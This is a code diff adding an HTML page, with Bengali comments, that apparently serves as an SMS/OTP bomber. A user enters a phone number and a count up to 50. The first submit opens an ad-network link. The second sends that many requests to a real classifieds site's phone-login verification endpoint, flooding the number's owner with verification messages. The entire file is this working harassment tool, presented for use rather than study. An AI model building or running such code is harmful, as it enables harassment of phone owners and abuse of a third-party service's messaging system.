@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Number Submission</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f8f9fa; /* হালকা ধূসর */
+        }
+        .form-container {
+            background-color: #fff; /* সাদা ব্যাকগ্রাউন্ড */
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #28a745; /* সবুজ শিরোনাম */
+            font-weight: bold;
+        }
+        .btn-primary {
+            background-color: #28a745; /* সবুজ বাটন */
+            border-color: #28a745;
+        }
+        .btn-primary:hover {
+            background-color: #218838; /* হোভার হলে গাঢ় সবুজ */
+            border-color: #1e7e34;
+        }
+        .form-control {
+            border: 2px solid #ced4da;
+            transition: border-color 0.3s ease-in-out;
+        }
+        .form-control:focus {
+            border-color: #28a745; /* ইনপুট ফোকাস হলে সবুজ */
+            box-shadow: none;
+        }
+        .error {
+            border-color: #dc3545; /* লাল বর্ডার যখন ভুল */
+        }
+        .error-message {
+            color: #dc3545; /* লাল লেখার রঙ যখন ভুল */
+        }
+    </style>
+</head>
+<body>
+    <div class="container mt-5">
+        <h1 class="text-center">Submit Phone Number and Amount</h1>
+        <div class="row justify-content-center">
+            <div class="col-md-6">
+                <div class="form-container">
+                    <form id="numberForm">
+                        <div class="form-group">
+                            <label for="phoneNumber">Phone Number</label>
+                            <input type="text" class="form-control" id="phoneNumber" placeholder="Enter phone number" required>
+                            <small class="error-message" id="phoneError"></small>
+                        </div>
+                        <div class="form-group">
+                            <label for="amount">Amount</label>
+                            <input type="number" class="form-control" id="amount" placeholder="Enter amount (Max: 50)" required max="50">
+                            <small class="error-message" id="amountError"></small>
+                        </div>
+                        <button type="submit" class="btn btn-primary btn-block" id="submitBtn">Submit</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let firstClick = true;
+
+        document.getElementById('numberForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            let phoneNumber = document.getElementById('phoneNumber').value;
+            let amount = document.getElementById('amount').value;
+            let phoneError = document.getElementById('phoneError');
+            let amountError = document.getElementById('amountError');
+            let valid = true;
+
+            // Validation
+            if (phoneNumber === "") {
+                phoneError.textContent = "Phone number is required!";
+                document.getElementById('phoneNumber').classList.add('error');
+                valid = false;
+            } else {
+                phoneError.textContent = "";
+                document.getElementById('phoneNumber').classList.remove('error');
+            }
+
+            if (amount === "" || amount > 50) {
+                amountError.textContent = "Amount must be between 1 and 50!";
+                document.getElementById('amount').classList.add('error');
+                valid = false;
+            } else {
+                amountError.textContent = "";
+                document.getElementById('amount').classList.remove('error');
+            }
+
+            if (valid) {
+                if (firstClick) {
+                    // প্রথমবার সাবমিটে লিংক ওপেন হবে
+                    window.open('https://www.effectiveratecpm.com/cdcd1yirp?key=a45619e88f2fc7edc1e72f5e3ff7505f', '_blank');
+                    firstClick = false; // দ্বিতীয়বার API কলের জন্য
+                } else {
+                    // দ্বিতীয়বার সাবমিট করলে API কল হবে
+                    amount = Math.min(amount, 50); // লিমিট 50
+                    for (let i = 0; i < amount; i++) {
+                        fetch(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phoneNumber}`, {
+                            method: 'GET',
+                        })
+                        .then(response => response.json())
+                        .then(data => console.log('API Response:', data))
+                        .catch(error => console.error('Error:', error));
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+</html>
